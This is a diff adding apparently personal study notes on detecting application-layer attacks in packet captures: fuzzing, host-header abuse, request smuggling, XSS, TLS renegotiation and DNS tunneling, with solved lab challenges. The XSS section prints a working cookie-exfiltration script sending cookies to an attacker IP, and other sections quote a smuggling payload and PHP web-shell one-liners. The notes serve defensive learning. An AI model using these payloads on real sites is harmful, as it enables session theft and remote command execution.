@@ -431,5 +431,383 @@
     - j'ai deja ca >> `echo 'VGhpcyBpcyBhIHNlY3VyZSBrZXk6IEtleTEyMzQ1Njc4OQo=' | base64 -d`
     - Voila >> `This is a secure key: xxxxxxxxxxxx`
 
+
 # Application Layer Attacks
+- Important Info
+## HTTP/HTTPs Service Enumeration
+- **Fuzzing Attempts:**
+    1. Excessive HTTP/HTTPs traffic from one host
+    2. Referencing our web server's access logs for the same behavior
+
+    3. Attackers will attempt to **fuzz our server** to *gather information* `before attempting to launch an attack.`
+
+    4. WAF >> **Web Application Firewall** >> We need it to protect
+
+- **Finding Directory Fuzzing:**
+    1. Goal >> to find all possible web pages and locations in our web applications
+    2. `http` >> all HTTP related >> `http.request` >> if want only requests
+
+    - **Scenario:**
+    1. A host will repeatedly attempt to access files on our web server which do not exist (response 404).
+    2. A host will send these in rapid succession.
+
+- **Detection:**
+    - Apache Server >> `cat access.log | grep "192.168.10.5"`
+    - `cat access.log | awk '$1 == "192.168.10.5"'`
+    -
+    - To limit traffic to just one host we can employ the following filter:
+        - `http.request and ((ip.src_host == <suspected IP>) or (ip.dst_host == <suspected IP>))`
+    - Another option: in Wireshark >> `Follow > HTTP Stream`
+
+- **Attackers are not fool:**
+    1.  attackers will do the following to prevent detection
+        - *they take a time between each request >> so no immediate*
+        - *Send these responses from multiple hosts or source addresses.*
+
+- **Prevent Fuzzing:**
+    1. Configure WAF, Web Server to avoid those scanners by **returning proper response codes**
+    2. Block the suspicious IPs at WAF
+
+- **Practical Challenge:**
+    1.  Inspect the basic_fuzzing.pcapng file, part of this module's resources, and
+        enter the total number of HTTP packets that are related to GET requests against port 80 as your answer.
+
+    **Solved:**
+    - J'ai utilise le command: `http.request == GET and tcp.port == 80`
+    - Voila, j'ai obtenu le drapeau
+
+
+## Strange HTTP Headers
+- **Finding Strange Host Headers:**
+    - only http, exclude the legitimate traffic (web server's real IP)
+    - `http.request and (!(http.host == "192.168.10.7"))`
+
+    - Then check each HTTP info in Wireshark >> you see that **HOST: 127.0.0.1 or admin**
+    - **use different host headers to gain levels of access** >>
+    - which *they would not normally achieve through the legitimate host.*
+    - `They may use proxy tools like burp suite or others to modify these before sending them to the server`
+    -
+    - **Prevention:**
+        1. Ensure that our virtualhosts or access configurations are setup correctly to prevent this form of access.
+        2. Ensure that our web server is up to date.
+
+- **Analyzing Code 400s and Request Smuggling:**
+    - `http.response.code == 400` >> nice to start the malicious requests
+    - they show that user, client asked something bad from the server
+
+- **Deep Analyze:**
+    1. In this request >> we found **HTTP Stream**
+        - with the following request >>
+        - `GET%20%2flogin.php%3fid%3d1%20HTTP%2f1.1%0d%0aHost%3a%20192.168.10.5%0d%0a%0d%0aGET%20%2fuploads%2fcmd2.php%20HTTP%2f1.1%0d%0aHost%3a%20127.0.             0.1%3a8080%0d%0a%0d%0a%20HTTP%2f1.1 Host: 192.168.10.5`
+
+    2. If decoded in the server level:
+        - `GET /login.php?id=1 HTTP/1.1
+          Host: 192.168.10.5
+
+          GET /uploads/cmd2.php HTTP/1.1
+          Host: 127.0.0.1:8080
+
+          HTTP/1.1
+          Host: 192.168.10.5`
+
+    3. Why it is dangerous?
+        1. `The first request` looks good >> and can be approved by `fronted server` > the Apache
+            - so it only checks the first part
+        2. Then >> The back-end will get it >> its behavior is to run all these requests, commands
+            - here is the hot problem
+        3. The second request >> `access to cmd2.php` is to give remote control inside this server `using (127.0.0.1) loopback`
+            - problem >> access to `Web shells (cmd2.php)` >> `Internal admin panels (127.0.0.1:8080/admin)`
+        4. The third request >> *acts as garbage input, padder, or to mess with server's parsing
+           logic to bypass the protections, or insert extra requests*
+
+    4. Overall that's what *HTTP Request Smuggling*
+        - delivering unwanted HTTP requests in a sneaky ways
+    5. To understand better look at "How Web Server Works" below!
+
+- **Practical Challenge:**
+    1. Inspect the CRLF_and_host_header_manipulation.pcapng file, part of this module's resources, and
+       enter the total number of HTTP packets with response code 400 as your answer.
+
+    **Solved:**
+    - J'ai utilise le command: `http.response.code == 400`
+    - Voila, c'est fini!
+
+
+## How Web Server Works
+- How Usually **Web Servers** are working >> their architecture:
+        - **Client /Browser >> Fronted-Server >> Backend-Server >> Database**
+    2. What's in Fronted Server?
+            - *Apache, Nginx, Load Balancer*
+            - Listens for public HTTP/HTTPS traffic. >> Handles TLS (SSL) encryption.
+            - Caches or compresses static files (CSS, JS, images). >> **Forwards requests to the back-end server.**
+    3. What's in Backend-Server?
+            - *PHP-FPM, Node.js, Flask, Django, Tomcat*
+            - `Runs your actual application code.`
+            - Connects to databases.
+            - Generates the dynamic HTML response.
+
+- How **Apache** Works?
+        1. It's Fronted-Server >> it takes the http requests first
+        2. In this point >> it tries to *hide internal part of the server such as backend*
+        3. It does *security filtering*
+           - Block bad IPs
+           - Filter malicious input
+           - Add SSL/TLS (HTTPS)
+           - Do basic firewall duties
+           - Why all this? >> *to safeguard the back-end and less exposed to the internet*
+        4. It does *load balancing*
+           - send traffic  >> Server #1 >> #2 >> #3
+        5. It does *URL Rewriting*
+           - let's say >> the apache got this >> `/categories/books`
+           - it rewrites >> `/categories.php?id=books`
+           - Why? to have **nice clean URL for the user**
+
+- How **Apache May Talk To Back-end?:**
+        1. Usually through `reverse proxy:`
+            - forward proxy >> `client > proxy > internet` (protects client)
+            - reverse proxy >> `server-side proxy` >> the client > server > `server proxies it internally to a hidden backend app.`
+            - so it protects server
+           - `User → Reverse Proxy (Apache) → Backend`
+
+- **Some Difference in Request Handling**
+        1. Apache may send `raw HTTP requests` without filter/ normalizing / sanitizing
+        2. Backend may `execute the malicious requests`
+        **Or**
+        1. The front-end server (Nginx) might read `only the first part`
+        2. But the back-end server (PHP-FPM) might read `the entire thing`
+
+## Cross-Site Scripting (XSS) & Code Injection Detection
+- **How it works**
+    1. attacker puts malicious code in web page through the user input (comments)
+    2. then when other users visit our website, this code in the comments let's say will be executed
+    3. then it sends other visitors credentials to the attacker
+
+    4. Script example in JavaScript
+        - `<script>
+                // 1. When the page finishes loading, run the function
+                window.addEventListener("load", function() {
+
+                // 2. Set the attacker's server URL where data will be sent
+                const url = "http://192.168.0.19:5555";
+
+                // 3. Prepare the data to send: the user's cookies, URL-encoded
+                const params = "cookie=" + encodeURIComponent(document.cookie);
+
+                // 4. Create a new HTTP request object
+                const request = new XMLHttpRequest();
+
+                // 5. Configure the request to send a GET to attacker's server with cookies as a query parameter
+                request.open("GET", url + "?" + params);
+
+                // 6. Send the request (exfiltrate the cookies)
+                request.send();
+            });
+        </script>`
+        -
+        5. The honey part is that >> victim sends `GET` request to the attacker
+            - this request includes cookies as query parameter
+            -
+- **Detection:**
+    1. While analyzing NTA, Give a red flag to the *non-webser hosts* who is getting `GET` reqeusts
+    2. Good amount of requests were being sent to an `internal "server,"` >> **we did not recognize**
+    3. Indication of cross-site scripting.
+
+- **Code Injection**
+    1. Attacker may put some codes into these fields(comments section) like the following two examples.
+        - `<?php system($_GET['cmd']); ?>` >> **To get command and control through PHP.**
+        - `<?php echo `whoami` ?>`
+
+- **Preventing XSS and Code Injection**
+    1. Sanitize and handle user input in an acceptable manner.
+    2. Do not interpret user input as code.
+
+- **Practical Challenge:**
+    1. Inspect the first packet of the XSS_Simple.pcapng file, part of this module's resources, and
+       enter the cookie value that was exfiltrated as your answer.
+
+    **Solved:**
+    - J'ai utilise ce process >>
+    - J'ai choisi le premier code >> avec GET` >> `Follow > HTTP Stream`
+    -
+
+## SSL Renegotiation Attacks
+- **How HTTPs Works with Server?:**
+    1. `Handshake` >> to clarify which encryption algorithms to use, & exchange certs
+    2. `Encryption` >> they use the agreed algorithm to encrypt the further data
+    3. `Further Data Exchange` >> start to exchange data: web pages, images, or other web resources.
+    4. `Decryption` >> happens in both sides
+
+- **Goal of SSL Renegotiation:**
+    - *Negotiate the session to the lowest possible encryption standard.* \\
+
+- **TLS Handshake Process:**
+    1. Client and Server finished `TCP Handshake`
+    2. Then immediately, client sends `Client Hello` to Server
+        - This message includes: TLS/SSL versions and encryption algorithms to choose by server, and some random data (nonces)
+    3. Then, Server sends `Server Hello` to Client
+        - This message includes: chosen TLS/SSL version, chosen encryption algorithm, and additional (nonces)
+    4. `Certificate Exchange` >> Server sends its certificate >> *proves its identity >> includes public key*
+    5. `Key Exchange` >> client generates *premaster secret* >> it encrypts this secret using public key of server >> then sends it to server
+    6. `Session Key Derivation` >> *both the client and the server use the nonces exchanged in the first two steps*
+        - along with the *premaster secret* to **compute the session keys**
+        - **These session keys are used for symmetric encryption and decryption of data during the secure connection.**
+        - That's how symmetric key is generated, I guess
+    7. `Finished Messages` >>  verify the handshake is completed and successful
+        - This message: includes the hash of `all previous handshake messages` and `is encrypted using the session keys.`
+
+    8. `Secure Data Exchange` >> all set up is done >> start the communication
+
+- **Diving into SSL Renegotiation Attacks:**
+    1. *To find irregularities in handshakes:* in Wireshark or TCPDump
+        - `ssl.record.content_type == 22` >> **22 specifies handshake messages only**
+    2. **What we look for the Renegotiation Attacks:?**
+        1. `Multiple Client Hellos` >> *attacker repeats this message to trigger renegotiation and hopefully get a lower cipher suite.*
+        2. `Out of Order Handshake Messages` >> when **the server receives a client hello after completion of the handshake.**
+
+    3. **Impact:**
+        - `Denial of Service` - *SSL renegotiation attacks consume a ton of resources on the server side*
+        - `SSL/TLS Weakness Exploitation` >> *potentially exploit vulnerabilities with our current implementation of cipher suites.*
+
+- **Practical Challenge:**
+    1.  Inspect the SSL_renegotiation_edited.pcapng file, part of this module's resources, and
+        enter the total count of "Client Hello" requests as your answer.
+
+    **Solved:**
+    - J'ai utilise ce command: `ssl.record.content_type == 22` >> pour voir combien de Hello messages
+    - Voila, j'ai obtenu le drapeau
+
+
+## Peculiar DNS Traffic
+- **DNS Query Process**
+    1. Query Initiation
+    2. Local Cache Check
+    3. Recursive Query >> client then sends its recursive query to its configured DNS server `(local or remote).`
+    4. Root Servers >> The DNS resolver, if necessary, starts by querying the root name servers to `find the authoritative name servers`
+        - to ask from  for the **top-level domain (TLD)**
+        - There are 13 root servers distributed worldwide.
+    5. TLD Servers >> The **root server** then responds with the authoritative name servers for the TLD (aka .com or .org)
+    6. Authoritative Servers >> The DNS resolver then queries the TLD's authoritative name servers for the second-level domain (aka hackthebox.com).
+    7. Domain Name's Authoritative Servers >> Finally, the DNS resolver queries the domains authoritative name servers
+       to obtain the IP address associated with the requested domain name (aka academy.hackthebox.com).
+
+    8. Response >> Voila, enfin, il a recu la reponse pour FQDN ou pour IP address
+
+- **DNS Reverse Lookups/Queries**
+    1. Query Initiation
+    2. Reverse Lookup Zones >>  DNS resolver checks if it is authoritative for the reverse lookup zone
+       that corresponds to the IP range as determined by the received IP address.
+       Aka 192.0.2.1, the reverse zone would be 1.2.0.192.in-addr.arpa
+
+    3. PTR Record Query >> Pointer ::The DNS resolver then looks for a PTR record on the reverse lookup zone that corresponds to the provided IP address.
+
+- **DNS Record Types:**
+    1. `A` >> Address >> IPv4
+    2. `AAAA` >> IPv6 Address
+    3. `CNAME` >> Canonical Name >> *creates an alias for the domain name. Aka hello.com = world.com*
+    4. `MX` >> Mail Exchange >> the mail server responsible for receiving email messages on behalf of the domain.
+    5. `NS` >> Name Server >>    an authoritative name servers for a domain.
+    6. `PTR` >> Pointer >> used in reverse queries to map an IP to a domain name
+    7. `TXT` >> text >> specify text associated with the domain
+    8. `SOA` >> dministrative information about the zone
+
+- **Finding DNS Enumeration Attempts:**
+    1. `dns` >> look for any requests include >> **ANY** indication of DNS enumeration and possibly even subdomain enumeration
+    2. Goal is to find all info: DNS Records, subdomains,
+
+- **Finding DNS Tunneling:**
+    - Happens through the `TXT` record
+    - Then check for the data details >> parfois plaintext >> encoded >> encrypted
+    - Need to run multiple times `base64 -d` like trois fois >> pas toujours mais parfois
+    -
+    - **TXT**
+    - normalement >> its size >> 100-300 bytes
+    - overall UDP packet == 512 bytes since it uses UDP 53
+    - attackers may assign more value to TXT
+    - one TXT string == 255 bytes maximum
+    - 1 KB == 1024 bytes >> 1 MB == 1024 KB
+    -
+- **Goals of using DNS Tunneling:**
+    1. Data Exfiltration
+    2. Command and Control
+    3. Bypassing Firewalls and Proxies
+    4. Domain Generation Algorithms (DGAs) >> *advanced malware will utilize DNS tunnels to communicate back to their command and control servers
+          that use dynamically generated domain names through DGAs.*
+
+
+## What is IPFS?
+- **IPFS** >>  Interplanetary File System
+    - **Decentralized way to store and share files on the internet**
+    1. Upload a file → IPFS breaks it into chunks.
+    2. Each chunk gets a unique hash (like a fingerprint).
+    3. Files are stored across many computers (nodes).
+    4. To get a file, you ask the network for its hash. called >> CID >> Content Identifier
+    5. Any node with that chunk sends it to you.
+    **No central server. Files are found by content, not by location (like a URL).**
+
+    6. How it is reassembled:
+    - IPFS uses a Merkle DAG (a kind of tree):
+    - The root CID points to sub-chunks
+    - IPFS fetches each chunk by its CID
+    - It rebuilds the file from the structure
+
+- **Example:**
+    - file.txt >> is in IPFS system is like this after uploading >>
+    - CID >> `QmS6eyoGjENZTMxM7UdqBk6Z3U3TZPAVeJXdgp9VK4o1Sz`
+    - You can connect it like this:
+    - `https://cloudflare-ipfs.com/ipfs/QmS6eyoGjENZTMxM7UdqBk6Z3U3TZPAVeJXdgp9VK4o1Sz`
+
+- **Why IPFS's Peer-to-Peer Nature Is Hard to Detect (In Short):**
+    ❌ No Central Server to Monitor:
+
+    IPFS doesn’t use a fixed server (like malware.com).
+
+    Files are requested by content (CID), not location (IP/domain).
+
+    🧑‍🤝‍🧑 P2P Traffic Looks "Normal":
+
+    Traffic goes to many random IP addresses (other peers).
+
+    That makes it blend in with normal P2P or CDN-like behavior.
+
+    🔐 Uses Standard Protocols (HTTP/S, DNS):
+
+    IPFS gateways use HTTPS, making traffic encrypted and harder to inspect.
+
+    Some malware even tunnels IPFS requests over DNS (e.g., using DNS tunneling), which can bypass firewalls.
+
+    📦 CIDs Don’t Look Suspicious:
+
+    A CID like QmS6eyoGjENZTM... doesn’t reveal what file it refers to.
+
+    You can’t tell if it’s benign or malicious without resolving and analyzing it.
+
+    🧲 Content Is Cached Across Nodes:
+
+    Even if the original malicious node disappears, other nodes may still serve the file, making takedown and tracking difficult.
+
+## Strange Telnet & UDP Connections
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
